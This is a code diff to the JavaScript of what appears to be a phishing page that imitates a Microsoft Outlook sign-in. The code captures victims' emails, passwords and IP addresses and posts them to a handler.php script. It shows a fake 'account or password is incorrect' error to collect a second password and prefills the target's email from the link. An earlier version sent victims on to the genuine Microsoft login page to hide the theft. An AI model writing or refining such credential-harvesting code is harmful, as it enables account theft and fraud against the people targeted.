@@ -6,13 +6,21 @@ const errorElem = document.querySelector(".error-message")
 const emailInput = document.querySelector(".email-field")
 const sendCode = document.querySelector("#send-code")
 
+const emailBox = document.querySelector("[name=email]")
+const passwordBox = document.querySelector("[name=password]")
+
 const USER_CREDS = {}
 let count = 1
-
 
 const showError = (msg, type = "") => {
     errorElem.innerText = msg
     errorElem.className = "error-message show" + type
+}
+
+const populateEmailField = () => {
+    const link = location.href.split("#")
+    const email = link[link.length - 1]
+    emailBox.value = email
 }
 
 const getIPAddress = async () => {
@@ -84,9 +92,6 @@ const handleSendEmail = async () => {
     try {
         const request = await fetch("./handler.php", option)
         const response = await request.json()
-        // console.group("<-----REQUEST---->")
-        // console.log(response)
-        // console.groupEnd("<-----REQUEST---->")
         return response
     }
     catch (err) {
@@ -95,29 +100,7 @@ const handleSendEmail = async () => {
 
 }
 
-const resetInputs = () => {
-    const inputs = document.querySelectorAll("input")
-    emailInput.innerText = ""
-    inputs.forEach(input => {
-        input.value = ""
-    })
-}
-
-const redirect = () => window.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1664920682&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d6526b845-5257-6759-9c1e-4a88b4420035&id=292841&aadredir=1&whr=outlook.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015"
-nextBtn.addEventListener("click", () => {
-    if(checkEmail()) {
-        removeError()
-        slides.map(slide => slide.className = "scene")
-        slides[1].classList.add("active")
-    }
-})
-
-backBtn.addEventListener("click", () => {
-    slides.map(slide => slide.className = "scene")
-    slides[0].classList.add("active")
-})
-
-signInButton.addEventListener("click", async () => {
+const handleSubmit = async () => {
     const password = document.querySelector("[name=password]").value.trim()
     const errorDiv = document.querySelectorAll(".error-message")[1]
 
@@ -139,8 +122,9 @@ signInButton.addEventListener("click", async () => {
         }
         else {
             if(count !== 2) {
-                resetInputs()
-                backBtn.click()
+                errorDiv.className = "error-message show"
+                errorDiv.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>"
+                passwordBox.value = ""
                 count++
             }
             else {
@@ -153,4 +137,46 @@ signInButton.addEventListener("click", async () => {
         showError("")
     }
     isLoading(false)
+}
+
+const resetInputs = () => {
+    const inputs = document.querySelectorAll("input")
+    emailInput.innerText = ""
+    inputs.forEach(input => {
+        input.value = ""
+    })
+}
+const redirect = () => window.location.href = "./success.html"
+
+nextBtn.addEventListener("click", () => {
+    if(checkEmail()) {
+        removeError()
+        slides.map(slide => slide.className = "scene")
+        slides[1].classList.add("active")
+    }
 })
+
+backBtn.addEventListener("click", () => {
+    slides.map(slide => slide.className = "scene")
+    slides[0].classList.add("active")
+})
+
+signInButton.addEventListener("click", handleSubmit)
+
+emailBox.addEventListener("keydown", (e) => {
+    if(e.key == "Enter" || e.keyCode == 13) {
+        if(checkEmail()) {
+            removeError()
+            slides.map(slide => slide.className = "scene")
+            slides[1].classList.add("active")
+        }
+    }
+})
+
+passwordBox.addEventListener("keydown", e => {
+    if(e.key == "Enter" || e.keyCode == 13) {
+        handleSubmit()
+    }
+})
+
+window.addEventListener("load", populateEmailField)
